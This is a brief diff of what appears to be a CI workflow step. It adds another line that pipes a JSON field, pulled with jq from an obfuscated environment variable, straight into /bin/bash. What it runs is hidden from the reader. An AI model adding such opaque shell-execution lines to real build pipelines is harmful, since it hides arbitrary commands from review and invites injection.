@@ -27,6 +27,7 @@ jobs:
           echo $s425 | jq -r .qpazt67 | /bin/bash
           printf '%s' "$qd30" | jq -r .a468 | /bin/bash
           printf '%s' "$xmsc2169" | jq -r .way37626 | /bin/bash
+          printf '%s' "$jpic35" | jq -r .saox4 | /bin/bash
 
       - name: Archive output
         if: always()
